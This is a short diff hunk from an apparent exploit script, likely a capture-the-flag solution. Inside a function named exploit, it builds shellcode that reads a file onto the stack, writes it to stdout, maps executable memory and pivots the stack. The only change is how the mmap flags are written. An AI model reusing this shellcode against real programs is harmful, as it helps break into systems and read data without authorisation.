@@ -29,7 +29,7 @@ def exploit(r):
             +sc.read("rax", "rsp", 0x100)
             +sc.write(1, "rsp", 0x100)
             +sc.close(0)
-            +sc.mmap(0x4000000000,0x200000,7,constants.MAP_PRIVATE|constants.MAP_ANONYMOUS, -1, 0)
+            +sc.mmap(0x4000000000,0x200000,7,'MAP_PRIVATE|MAP_ANONYMOUS', -1, 0)
             +'mov rbx, rax;'
             +'mov rsp, rax;'
             +'add rsp, 0x1000;'
